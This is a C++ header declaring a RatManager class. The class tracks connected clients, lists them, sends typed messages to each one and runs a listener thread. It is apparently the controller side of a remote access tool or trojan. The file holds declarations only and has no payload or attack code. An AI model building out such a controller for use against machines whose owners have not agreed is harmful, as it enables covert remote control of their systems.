#pragma once

#include <vector>

#include "ClientPipe.h"
#include "ICommunicationFactory.h"
#include "IConnectionListener.h"
#include "IRatManager.h"
#include "IThreadGuard.h"

class RatManager final : public IRatManager
{
public:
	explicit RatManager(
		ICommunicationFactory* factory,
		std::unique_ptr<IConnectionListener> server);

	~RatManager() override;

	[[nodiscard]] int GetClientCount() const override;

	[[nodiscard]] ClientInfo* GetClients() override;

	[[nodiscard]] int Send(int client, MessageType type, SharedSpan content) const override;

	void Join() override;

private:
	void Listen();

	void OnDisconnection(int client);

	static void OnMessage(
		int client,
		MessageType type,
		SharedSpan content);

	ICommunicationFactory* _factory;
	std::unique_ptr<IConnectionListener> _server;
	std::vector<std::shared_ptr<IClientPipe>> _clients;
	std::unique_ptr<IThreadGuard> _listenThread;
	int _clientCount;
	bool _isTerminationRequested;
};

